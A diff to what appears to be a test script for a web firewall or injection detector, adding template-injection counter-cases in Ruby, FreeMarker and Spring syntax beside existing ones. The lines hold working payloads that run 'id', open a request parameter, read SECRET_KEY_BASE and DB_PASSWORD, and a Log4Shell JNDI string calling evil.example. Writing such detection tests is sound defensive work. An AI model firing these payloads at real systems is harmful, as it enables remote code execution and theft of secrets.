@@ -191,6 +191,11 @@ q $A ssti "operator after filter name" "{{ x|raw??app.request.server.all|join }}
 json $A ssti "ruby kernel constant call" '{"note":"#{Kernel::system(\"id\")}"}'
 q $A ssti "freemarker bind via var"    "<#assign c=\"freemarker.template.utility.Execute\"><#assign e=c?new()>\${e(\"id\")}"
 q $A ssti "ruby env index"             "#{ENV['SECRET_KEY_BASE']}"
+# Aegolith: counter-cases for the inverted #{ } reading and the FreeMarker directive guard (alpha.6 re-review).
+json $A ssti "ruby call blank paren"   '{"note":"#{system (\"id\")}"}'
+q $A ssti "ruby safe navigation"       "#{Kernel&.open(params[:c])}"
+q $A ssti "freemarker eval binding"    "<#assign e=c?eval>\${e('id')}"
+q $A ssti "spring system environment"  "#{systemEnvironment['DB_PASSWORD']}"
 
 # --- 7. Log4Shell / JNDI ---------------------------------------------------------------------------------------
 hdr $A log4shell "jndi in user-agent"  User-Agent "\${jndi:ldap://evil.example/a}"
